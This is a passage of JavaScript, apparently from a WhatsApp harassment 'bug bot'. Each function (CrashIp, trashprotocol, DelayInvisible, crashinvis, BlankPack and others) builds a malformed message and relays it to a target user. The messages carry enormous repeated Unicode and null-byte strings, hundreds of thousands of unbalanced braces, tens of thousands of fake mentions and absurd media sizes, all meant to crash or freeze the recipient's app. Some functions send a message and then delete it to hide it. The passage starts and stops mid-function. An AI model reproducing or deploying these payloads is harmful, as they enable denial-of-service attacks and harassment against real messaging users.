  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Dellay6(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

const zephyrine = {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
    "fileLength": "327833",
    "seconds": 15,
    "mediaKey": "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
    "caption": "X-Angel InvosionSqlForce",
    "height": 1248,
    "width": 704,
    "fileEncSha256": "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
    "directPath": "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1748347294",
    "contextInfo": { isSampled: true, mentionedJid: mentionedList },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "\n\n"
        },
    "streamingSidecar": "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
    "thumbnailDirectPath": "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
    "thumbnailSha256": "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
    "thumbnailEncSha256": "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
    "annotations": [
      {
        "embeddedContent": {
          "embeddedMusic": {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "X-Angel InvosionSqlForce",
        title: "X-Angel InvosionSqlForce",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
          }
        },
        "embeddedAction": true
      }
    ]
  }
}

    const pherlne = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
           contextInfo: {
           mentionedJid: mentionedList,
            caption: "X-Angel InvosionSqlForce",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
           }
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { zephyrine } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, pherlne, {});
  
    for (const msg of [msg1, msg2]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}           

async function trashprotocol(target, mention) {
    const messageX = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@Darkness_Reals",
                    listType: 2,
                    buttonText: null,
                    sections: Array.from({ length: 9741 }, (_, r) => ({ 
                        title: "꧀".repeat(9741),
                        rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                    })),
                    singleSelectReply: { selectedRowId: "🐉" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () => 
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗̸̷̷̷̋͜͢͜͢͠͡͡𝐕𝐄𝐋𝐙-‣"
                        }
                    },
                    description: "𐌓𐌉𐌆𐌗𐌅𐌄𐌋𐌆 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, messageX, {});
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "false" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function CrashIp(target) {
    try {
        await sock.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: `https://` + `𑇂𑆵𑆴𑆿`.repeat(1817) + `.com`
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}



async function PayIphone(target) {
    await sock.relayMessage(
        target, {
            paymentInviteMessage: {
                serviceType: "FBPAY",
                expiryTimestamp: Math.floor(Math.random() * -20000000),
            },
        }, {
            participant: {
                jid: target,
            },
        }
    );
}

async function Infinite(target) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "GetsuzoCompany",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
          messageParamsJson: "{[".repeat(20000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(20000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
               {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
                {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ "cameraAccess": true, }),
              },
            ],
            messageParamsJson: "{[".repeat(30000),
          }, 
        },
      },
    },
  };

  const [janda1, janda2] = await Promise.all([
    await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda1 } }),
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda2 } })
  ]);
}

async function Infinite2(target) {
  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "Getsuzo Company:" },
          footer: { text: "Premision GetsuzoCompany" },
          header: { title: "Menu Utama" },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "...",
                  sections: [
                    {
                      title: "GetsuzoCompany",
                      rows: [
                        { header: "ꦽ", title: "ꦽ", id: "ꦽ" },
                        { header: "ꦽ", title: "ꦽ", id: "ꦽ" }
                      ]
                    }
                  ]
                })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
               {
               name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
               {
               name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              }
            ]
          }
        }
      }
    }
  }

  await sock.relayMessage(target, message, { messageId: '' })
}


async function Am(target) {  
  let msg = {
    stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.15575-24/531394224_1769273720396834_917219850068298254_n.enc?ccb=11-4&oh=01_Q5Aa2QG9sgfqFiPkXpIE9ii0iUKgTKpWb3-4hfJ2O13OYemXrw&oe=68C69453&_nc_sid=5e03e0&mms3=true",
        fileSha256: "61bGpsFlkhDNSzP7iGpkZ4g8/lNG0IYYKSusMs5I5Uc=",
        fileEncSha256: "UdjQrI89kosNE4zZGPfqPSTxAohlIlTW0dfGTAz5ikk=",
        mediaKey: "up/4gSlgR/uhHeGcgd9fdRtUMjfbPMNCbfxbINXlQgU=",
        mimetype: "application/was",
        height: 9999,
        width: 9999,
        directPath: "/v/t62.15575-24/531394224_1769273720396834_917219850068298254_n.enc?ccb=11-4&oh=01_Q5Aa2QG9sgfqFiPkXpIE9ii0iUKgTKpWb3-4hfJ2O13OYemXrw&oe=68C69453&_nc_sid=5e03e0",
        fileLength: "999999999999999999",
        mediaKeyTimestamp: "1755253587",
        isAnimated: true,
        stickerSentTs: "1755253587205",
        isAvatar: false,
        isAiSticker: false,
        isLottie: true,        
      contextInfo: {
        participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "target",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    },
  };
  
  await sock.relayMessage(target, msg, {
    participant: { jid:target }, 
    messageId: null
  });
}

async function BlankPack(target) {
  let Message = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: crypto.randomUUID()
    },
    message: {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "ꦽ".repeat(45000),
        publisher: "El Kontole",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: target,
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
          ]
        },
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "REJECTED",
            durationSecs: "1",
            callType: "SCHEDULED_CALL",
            participants: [
              { jid: target, callOutcome: "CONNECTED" },
              { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
              { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
              { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", Message.message, {
    messageId: Message.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });
}

async function locInter(target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "The Getsuzo" + "\u0000".repeat(9000) + "𑇂𑆵𑆴𑆿".repeat(10000),
            locationMessage: {
              degreesLatitude: 25.0208,
              degreesLongitude: -25.0208, 
              name: "Getsuzo", 
              url: ("https://Wa.me/stickerpack/D7eppeli").repeat(2000),
            }, 
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000), 
              buttons: [
                {
                  name: "single_select", 
                  buttonParamsJson: "{\"status\":true}"
                },
                {
                  name: "galaxy_message", 
                  buttonParamsJson: JSON.stringify({
                    icon: "REVIEW", 
                    flow_cta: "\u0000", 
                    flow_message_version: "3"
                  })
                }
              ]
            }
          }
        }
      }
    }
  }, {})
}

async function lottiePack(target) {
  let stickers = [];
  
  for(let y = 0; y < 1000; y++) { // atur aja anunya
    let lottie = {
      fileName: "YHvA1PXb8Y5e2L8pCRjnut4n6DlSRdg9bXtl-op22nQ=.was",
      isAnimated: true,
      emojis: [
        "🔥"
      ],
      accessibilityLabel: "Create What God Would Never Design",
      isLottie: true,
      mimetype: "application/was"
    };
    stickers.push({lottie});
  };
  
  let msg = {
    stickerPackMessage: {
      stickerPackId: "4353f07f-0ddc-4f37-8864-7d5dde17fb06",
    stickerPackUrl: "https://Wa.me/stickerpack/d7y" + "?¿".repeat(20000),
      name: "D | 7eppeli-Exploration",
      publisher: "",
      stickers: stickers,
      fileLength: "56800",
      fileSha256: "vEaL+n5DubWQBXuk/y4fY9rko0JIlhPOG7/3+kYay2o=",
      fileEncSha256: "Ui6ec+UryXswgCHp/ixzhlM96/I20hwE7EhyoLtTuto=",
      mediaKey: "OIB399e7ZKWQT+KMztghdKovvrKSXCjB9CwP0XQZgHM=",
      directPath: "/v/t62.15575-24/536718863_1457265171986689_8703320723734092471_n.enc?ccb=11-4&oh=01_Q5Aa2QHAuCoIkGGtrDlSV6OJfrw95Mtc9BCrP2ItRliTwrw6dA&oe=68CE9DE4&_nc_sid=5e03e0",
      contextInfo: {
        isForwarded: true, 
        forwardingScore: 250208,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        }, 
        participant: "13135550002@s.whatsapp.net", 
        remoteJid: "status@broadcast", 
        quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: ".", 
              format: "DEFAULT"
            }, 
            nativeFlowResponseMessage: {
              buttons: [
                {
                  name: "galaxy_message", 
                  buttonParamsJson: "\u0000".repeat(9000)
                }
              ]
            }
          }
        }
      },
      mediaKeyTimestamp: "1755786037",
      trayIconFileName: "4353f07f-0ddc-4f37-8864-7d5dde17fb06.png",
      thumbnailDirectPath: "/v/t62.15575-24/536986955_1161208622698684_8353863618424840340_n.enc?ccb=11-4&oh=01_Q5Aa2QEHegssmzZpNShk4PbqW66r9XY_iA9EFg1PC3JfhX8JFg&oe=68CE8C3D&_nc_sid=5e03e0",
      thumbnailSha256: "cGtbEDJTfE7XhI9BCmN2m0S5EKgN2KmT8KFXQol/qfI=",
      thumbnailEncSha256: "ojn2U2ybtdgV1dXWaqDanv+rxKi6LXS0z0+gfkaT8iQ=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "MjI3NjM0YWRjZmJmYmI0YThmYmQ5NzhjMDU4NzIxZTZkNzIxYmE5ZTBjNGZjMTJkOTM4YzY3NDU2ZGI3YzAwYg==",
      stickerPackSize: "2502200825022008",
      stickerPackOrigin: "USER_CREATED"
    }
  };
  await sock.relayMessage(target, msg, {
    participant: { jid:target }
  });
}

async function BlankPack2(target) {
    await sock.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name:"ꦽ".repeat(45000),
      publisher: "El Kontole",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: target,
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
               { jid: target, callOutcome: "CONNECTED" },
               { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 }
 
 async function DelayInvisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "🩸",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function siu(target) {
  const buttonss = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 100; i++) {
    buttonss.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(30000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(30000) }) }
    );
  }

  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            externalAdReply: {
              title: "You" + "ꦽ ".repeat(10000), 
              body:  "Hama",
              mediaType: 1,
              thumbnailUrl: "https://Wa.me/stickerpack/D",
              sourceUrl:   "https://Wa.me/stickerpack/D",
              renderLargerThumbnail: true,
              showAdAttribution: true
            }
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true",
                    directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg",
                    mimetype: "image/jpeg",
                    width: 999999999,
                    height: 999999999,
                    fileLength: 43376,
                    fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
                    fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
                    mediaKeyTimestamp: 1753804634,
                    mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
                  }
                },
                body: { text: "," + "ꦽ".repeat(15000) },
                nativeFlowMessage: {
                  buttons: buttonss,
                  messageParamsJson: "{[".repeat(15000)
                }
              }
            ]
          }
        }
      }
    }
  };
  const [ke1, ke2] = await Promise.all([
    await sock.relayMessage(target, content, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    await sock.relayMessage(target, content, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: ke1 } }),
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: ke2 } })
  ]);
}

async function crashinvis(target) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await sock.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(70000)}`,
        orderTitle: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(30000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©LuciferNotDev",
            thumbnail: { url: "https://files.catbox.moe/kst7w4.jpg" },
            sourceUrl: "about:blank",
            sourceId: sock.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
